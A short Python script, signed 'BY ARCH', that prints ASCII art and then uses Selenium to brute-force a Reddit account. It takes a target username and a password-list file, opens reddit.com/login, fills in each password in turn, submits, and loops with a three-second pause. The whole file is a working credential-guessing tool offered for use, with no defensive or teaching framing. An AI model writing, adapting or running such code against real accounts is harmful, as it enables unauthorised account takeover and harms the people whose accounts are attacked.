from turtle import mainloop
from selenium import webdriver
import time
from pathlib import Path
                 
k=('''        **    ''')    
l=('''     *****    ''') 
m=('''    *  ***    ''')    
n=('''       ***    ''')
o=('''      *  **       ''')
p=('''      *  **       ''')
n=('''     *    **      ''')
o=('''     *    **      ''')
p=('''    *      **      ''')
q=('''    *********      ''')
r=('''   *        **     ''')
s=('''   *        **     ''')
t=('''  *****      **    ''')
u=(''' *   ****    ** *  ''')
v=('''*     **      **   ''')
w=('''*                  ''')
x=(''' **  			''')

                 
print(k)
time.sleep(0.2)
print(l)
time.sleep(0.2)
print(m)
time.sleep(0.2)
print(n)
time.sleep(0.2)
print(o)
time.sleep(0.2)
print(p)
time.sleep(0.2)
print(q)
time.sleep(0.2)
print(r)
time.sleep(0.2)
print(s)
time.sleep(0.2)
print(t)
time.sleep(0.2)
print(u)
time.sleep(0.2)
print(v)
time.sleep(0.2)
print(w)
time.sleep(0.2)
print(x)
print("BY ARCH")
first=input("Enter the username: ")
second=input("Enter the pass file directory: ")
browser=webdriver.Chrome(
    executable_path='C:\\Users\\user\\Desktop\\Data\\chromedriver')
i=[]
filepath = Path(second)
lines = filepath.read_text()
i.append(lines.split('\n'))
b=0
def function(a):
    username=first
    user=browser.find_element_by_css_selector('#loginUsername')
    user.send_keys(username)
    i=[]
    filepath = Path(second)
    lines = filepath.read_text()
    i.append(lines.split('\n'))
    password=i[0][a]
    pass1=browser.find_element_by_css_selector('#loginPassword')
    pass1.send_keys(password)
    login=browser.find_element_by_css_selector('body > div > main > div.OnboardingStep.Onboarding__step.mode-auth > div > div.Step__content > form > fieldset:nth-child(8) > button')
    login.submit()
while True:
    browser.get('https://www.reddit.com/login/')
    function(b)
    b=b+1
    print(i[0][b])
    time.sleep(3)
   


    
   






